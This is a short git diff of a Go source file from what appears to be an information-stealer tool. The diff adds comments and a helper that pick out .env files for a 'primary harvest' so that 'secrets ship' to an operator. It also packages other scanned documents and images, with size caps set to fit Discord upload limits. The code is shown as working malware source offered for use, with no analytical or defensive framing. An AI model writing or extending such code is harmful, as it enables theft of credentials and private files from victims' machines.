@@ -1,3 +1,8 @@
+// export_files.go — phase-2 scanned-file packaging and .env placement.
+//
+// .env files are promoted into the primary harvest (env/) so secrets ship even
+// if the operator never downloads the larger files zip. Other scanned files go
+// under files/{documents,images,other}/ with per-file size caps.
 package main
 
 import (
@@ -8,9 +13,11 @@ import (
 	"recovery/recovery"
 )
 
-// Skip individual scanned files larger than this in phase-2 upload (Discord 25MB limit).
+// Cap individual scanned files so one huge item cannot force a whole zip over limit.
+// Leave room under maxDiscordUpload for zip/multipart overhead.
 const maxScannedFileUploadSize = maxDiscordUpload - 3*1024*1024
 
+// isEnvScannedFile detects dotenv-style names that belong in the primary harvest.
 func isEnvScannedFile(f recovery.FileResult) bool {
 	name := strings.ToLower(f.Name)
 	if name == ".env" || strings.HasPrefix(name, ".env.") {
